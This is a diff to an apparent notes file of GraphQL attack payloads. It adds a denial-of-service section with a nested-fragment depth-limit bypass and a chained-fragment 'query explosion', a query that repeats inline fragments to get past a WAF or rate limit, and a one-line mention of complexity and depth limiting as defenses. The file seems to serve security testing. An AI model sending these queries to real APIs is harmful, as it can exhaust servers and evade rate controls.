@@ -1,7 +1,8 @@
-Security Control Bypass with fragment reuse: 
-depth limit = 10
+DOS:
+  Security Control Bypass with fragment reuse: 
+  depth limit = 10
 
-fragment Deep1 on Level1 {
+    fragment Deep1 on Level1 {
   b {
     c {
       d {
@@ -26,6 +27,57 @@ fragment Deep1 on Level1 {
 query {
   a {
     ...Deep1
+  }
+}
+
+_________________________________________________
+Query Explosion : 
+
+fragment UserFields1 on User {
+  id
+  name
+  email
+}
+
+fragment UserFields2 on User {
+  ...UserFields1
+}
+
+fragment UserFields3 on User {
+  ...UserFields2
+}
+
+fragment UserFields4 on User {
+  ...UserFields3
+}
+
+fragment UserFields5 on User {
+  ...UserFields4
+}
+
+query {
+  me {
+    ...UserFields5
+  }
+}
+
+Defense : complexity  OR  depth limiter 
+
+
+_____________________________________________________
+WAF / Rate Limit bypass:
+
+query X {
+  user {
+    ... on User {
+      id
+    }
+    ... on User {
+      name
+    }
+    ... on User {
+      email
+    }
   }
 }
 
